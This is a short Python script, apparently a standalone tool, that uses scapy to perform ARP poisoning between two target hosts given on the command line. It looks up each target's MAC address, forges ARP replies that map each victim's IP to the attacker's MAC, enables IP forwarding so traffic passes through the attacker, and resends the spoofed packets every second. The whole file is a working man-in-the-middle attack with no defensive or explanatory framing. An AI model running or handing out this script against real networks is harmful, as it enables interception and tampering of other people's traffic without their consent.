from scapy.all import *
import argparse
import sys
import logging as lg
import os
import time

def get_mac_addr():
    return Ether().src

def get_ip_addr():
    return IP().src

def get_dist_mac(ip):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def set_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c1", "--cible1", help="First cible of arp poisoning")
    parser.add_argument("-c2", "--cible2", help="Second cible of arp poisoning")
    return parser

def create_who_has_packet(dst_mac, src_mac, my_ip, ip_dest):
    return ARP(op=2, hwdst=dst_mac, hwsrc=src_mac, psrc=my_ip, pdst= ip_dest)

def activate_routing(is_active):
    cmd = "sysctl -w net.ipv4.ip_forward={}".format(1 if is_active else 0)
    os.system(cmd)

if __name__ == "__main__":
    mac = get_mac_addr()
    ip = get_ip_addr()
    args = set_args().parse_args()

    if not mac:
        lg.warning("Can't find interface.")

    dst_mac1 = get_dist_mac(args.cible1)
    dst_mac2 = get_dist_mac(args.cible2)

    packet_one = create_who_has_packet(dst_mac1, mac, args.cible2, args.cible1)
    packet_two = create_who_has_packet(dst_mac2, mac, args.cible1, args.cible2)

    activate_routing(True)
    try:
        while True:
            send(packet_one)#, loop=1, inter=0.1)
            send(packet_two)#, loop=1, inter=0.1)
            time.sleep(1)
    except KeyboardInterrupt:
        activate_routing(False)
